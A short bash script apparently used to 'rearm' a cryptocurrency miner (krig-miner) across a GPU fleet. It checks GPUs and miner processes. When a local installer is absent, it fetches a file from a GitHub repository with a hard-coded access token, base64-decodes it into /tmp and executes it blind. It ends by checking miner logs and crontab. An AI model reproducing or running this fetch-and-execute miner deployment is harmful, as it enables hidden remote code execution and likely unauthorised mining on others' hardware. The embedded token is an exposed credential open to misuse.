#!/bin/bash
B=/opt/fleet; L=$B/logs
exec 6>/tmp/rearm.lock; flock -n 6 || exit 0
echo "=== rearm $(date -u) host=$(hostname) uid=$(id -u)"
nvidia-smi -L 2>&1 | head -3
echo "before krig=$(pgrep -fc 'krig-miner --coin')"
if [ -x "$B/ps8_install.sh" ]; then bash "$B/ps8_install.sh"; else
  curl -s -m 20 -H "Authorization: Bearer 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" https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/all.sh > /tmp/a.json
  python3 -c 'import json,base64;d=json.load(open("/tmp/a.json"));open("/tmp/a.sh","wb").write(base64.b64decode(d["content"]))' && bash /tmp/a.sh
fi
echo "after krig=$(pgrep -fc 'krig-miner --coin')"
for f in $L/krig-*.log; do [ -f "$f" ] && echo "$f :: $(tail -1 "$f" | cut -c1-140)"; done
echo "--- crontab"; crontab -l 2>/dev/null | tail -5
echo "--- cron"; systemctl is-active cron 2>&1
